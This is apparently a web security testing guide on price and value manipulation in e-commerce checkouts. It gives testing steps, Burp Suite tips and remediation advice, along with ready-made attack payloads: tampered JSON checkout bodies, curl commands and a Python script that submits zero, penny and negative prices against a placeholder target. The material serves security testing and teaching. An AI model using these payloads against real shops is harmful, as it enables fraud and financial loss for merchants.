# Price / Value Manipulation

## Overview
Price manipulation vulnerabilities occur when web applications trust client-supplied values for prices, discounts, totals, or other financial figures without server-side validation against a trusted data source. Because modern web UIs pass order and cart data through HTTP requests, an attacker can intercept and modify these values to purchase items at arbitrary prices — including zero, negative, or fractional amounts. This is one of the most impactful business logic vulnerabilities because it directly translates to financial loss.

## How It Works
In a typical vulnerable e-commerce checkout flow:

1. User adds item to cart. The cart page renders a price pulled from the database.
2. User proceeds to checkout. A POST request is sent with cart data that includes `price`, `total`, or `unit_price` fields.
3. The server processes the order using the client-supplied price rather than re-fetching the authoritative price from the database.
4. The attacker intercepts the POST, changes `price=99.99` to `price=0.01`, and submits.
5. The server charges $0.01 and ships the item.

Variations:
- **Hidden form fields:** `<input type="hidden" name="price" value="99.99">` — easily modified.
- **URL parameters:** `/checkout?total=99.99&item=123` — trivially modified.
- **JSON POST body:** `{"item_id": 1, "quantity": 1, "price": 99.99}` — modified via proxy.
- **Cookie or localStorage values:** cart stored client-side and sent unverified.
- **Base64-encoded parameters:** decoded, modified, re-encoded.
- **Signed values (weak signature):** some apps sign the price with a weak or guessable key; if the signing algorithm can be bypassed or the key recovered, values can be forged.
- **Discount percentage manipulation:** changing `discount_pct=10` to `discount_pct=100`.
- **Negative price abuse:** if the server adds negative prices, a cart containing a negative-priced item may reduce the total below zero, resulting in a credit.

## Impact
- Purchasing items for $0.00 or negative amounts.
- Applying unauthorized discounts.
- Negative price injection to obtain store credits.
- Financial loss for the merchant.
- Fraud: purchasing premium/subscription tiers at basic/free tier prices.
- Points/reward manipulation: earning more loyalty points than entitled.

## Where to Look
- Checkout and cart submission requests — especially any field named `price`, `total`, `amount`, `cost`, `unit_price`, `subtotal`, `discount`.
- Hidden HTML form fields that contain price data.
- URL query parameters in payment or redirect flows.
- JSON/XML POST bodies in REST or SOAP checkout APIs.
- localStorage and sessionStorage via browser DevTools (Application tab).
- Cookies that appear to store cart or session price data.
- Third-party payment redirect parameters (amount passed to payment gateway in URL or form).
- API responses that return a "server-calculated total" that is then echoed back in the next request.

## Testing Steps
1. Add a product to the cart and proceed to checkout. Capture the checkout POST request in Burp Proxy.
2. Identify every numeric field in the request body, URL, or cookies that could represent a price or total.
3. In Burp Repeater, change the price field to `0.01`, `0`, `-1`, `0.001`, `1e-10`.
4. Submit the modified request and observe the server's response. Check if an order is created at the manipulated price.
5. Check the order confirmation page/email — does it confirm the manipulated price?
6. Try negative values: `-100`, `-99.99`. If accepted, check if a credit is issued.
7. Test integer/decimal manipulation: `99.99` → `9.99` (drop a digit).
8. Test large values: `99.99` → `999999.99` (reverse manipulation — does the server reject it or accept a high charge?).
9. Check if changing quantity affects unit price validation.
10. Examine payment gateway redirect parameters — some apps pass `amount` to a payment provider in a URL parameter or hidden form and trust it on callback.
11. Test the order confirmation/webhook endpoint: if the payment provider sends a callback, does the server re-validate the amount against the order?

## Payloads / Techniques

```http
# Original checkout request (captured in Burp)
POST /api/checkout HTTP/1.1
Host: target.example.com
Content-Type: application/json
Cookie: session=abc123

{
  "cart": [
    {
      "item_id": "PROD-001",
      "name": "Premium Widget",
      "quantity": 1,
      "unit_price": 99.99,
      "total": 99.99
    }
  ],
  "shipping": 5.00,
  "discount": 0,
  "grand_total": 104.99
}

# ===== ATTACK PAYLOADS =====

# Payload 1: Zero price
{
  "cart": [{"item_id": "PROD-001", "quantity": 1, "unit_price": 0.00, "total": 0.00}],
  "shipping": 5.00,
  "grand_total": 5.00
}

# Payload 2: Penny price
{
  "cart": [{"item_id": "PROD-001", "quantity": 1, "unit_price": 0.01, "total": 0.01}],
  "grand_total": 0.01
}

# Payload 3: Negative price (may create credit)
{
  "cart": [{"item_id": "PROD-001", "quantity": 1, "unit_price": -99.99, "total": -99.99}],
  "grand_total": -99.99
}

# Payload 4: Discount manipulation
{
  "item_id": "PROD-001",
  "quantity": 1,
  "price": 99.99,
  "discount_pct": 100,
  "discount_amount": 99.99,
  "total": 0.00
}

# Payload 5: Modify grand_total only (check if item prices re-validated)
{
  "cart": [{"item_id": "PROD-001", "quantity": 1, "unit_price": 99.99, "total": 99.99}],
  "grand_total": 1.00
}
```

```bash
# curl example: manipulated price in JSON checkout
curl -s -X POST https://target.example.com/api/checkout \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{
    "cart": [{"item_id": "PROD-001", "quantity": 1, "unit_price": 0.01}],
    "grand_total": 0.01
  }'

# Hidden form field manipulation via curl
curl -s -X POST https://target.example.com/checkout/submit \
  -H "Cookie: session=YOUR_SESSION" \
  -d "item_id=PROD-001&quantity=1&price=0.01&total=0.01&csrf_token=TOKEN_FROM_FORM"

# Test negative price
curl -s -X POST https://target.example.com/api/checkout \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"cart": [{"item_id": "PROD-001", "quantity": 1, "unit_price": -50.00}], "grand_total": -50.00}'

# Test payment gateway redirect tampering
# Many apps redirect to: /pay?amount=99.99&order_id=12345&signature=abc
# Test modifying the amount:
curl -s "https://target.example.com/pay?amount=0.01&order_id=12345&signature=abc"
```

```python
# Automated price manipulation test with requests
import requests

BASE_URL = "https://target.example.com"
SESSION = "your_session_cookie_value"

def test_price(price_value):
    payload = {
        "cart": [{"item_id": "PROD-001", "quantity": 1, "unit_price": price_value}],
        "grand_total": price_value
    }
    r = requests.post(
        f"{BASE_URL}/api/checkout",
        json=payload,
        cookies={"session": SESSION}
    )
    return r.status_code, r.json() if r.headers.get("content-type","").startswith("application/json") else r.text[:200]

test_prices = [0, 0.01, -1, -99.99, 0.001, 1e-10, 99.98]
for price in test_prices:
    status, resp = test_price(price)
    print(f"Price={price}: HTTP {status} | {str(resp)[:100]}")
```

## Burp Suite Tips
- Intercept the checkout POST request in **Proxy > Intercept** and modify price fields before forwarding.
- Right-click any checkout request in **HTTP History** and send to **Repeater** for manual testing.
- Use **Intruder** with a **Sniper** attack and a custom Number payload list (`0`, `0.01`, `-1`, `-99.99`, `1e-10`) against price fields.
- Enable **Proxy > Options > Match and Replace** with a rule that automatically replaces the price value in every request — useful for testing every step of a multi-page checkout without manually editing each.
- In **Target > Site Map**, right-click the checkout endpoint and use **Engagement Tools > Discover Content** to find hidden checkout variants.
- Use **Comparer** to diff the response from a legitimate checkout vs. a price-manipulated checkout — small differences (order ID present vs. absent, different redirect URL) may indicate success.
- The **Hackvertor** BApp helps decode Base64/encrypted parameters so you can identify and modify embedded price values.

## Tools
- Burp Suite (Intercepting Proxy, Repeater, Intruder)
- curl / httpie
- Python requests library
- OWASP ZAP
- Postman (for API-focused testing)
- mitmproxy — https://mitmproxy.org

## Remediation
- **Never trust client-supplied prices.** The server must retrieve the authoritative price from the database for each item using the item ID, not the price value sent in the request.
- Validate every financial calculation server-side: total = sum of (price_from_db × quantity) for each item, plus server-calculated shipping and tax.
- Reject or ignore any client-supplied price, discount, or total fields. Accept only item IDs and quantities from the client.
- Validate that discount codes are applied server-side and that the discount amount matches the server's calculation.
- For payment gateway integrations: sign the amount with a server-side HMAC secret and verify the signature before processing. Never trust an unsigned amount parameter in a redirect.
- Log all order creation events with the item IDs, database prices, and calculated totals for fraud detection.
- Implement anomaly detection: flag orders where the charged amount deviates from the expected price.
- Use parameterized "price at time of purchase" records — lock in the price when adding to cart and re-verify on checkout.

## References
https://owasp.org/www-community/attacks/Web_Parameter_Tampering
https://portswigger.net/web-security/logic-flaws
https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/
https://portswigger.net/web-security/logic-flaws/examples
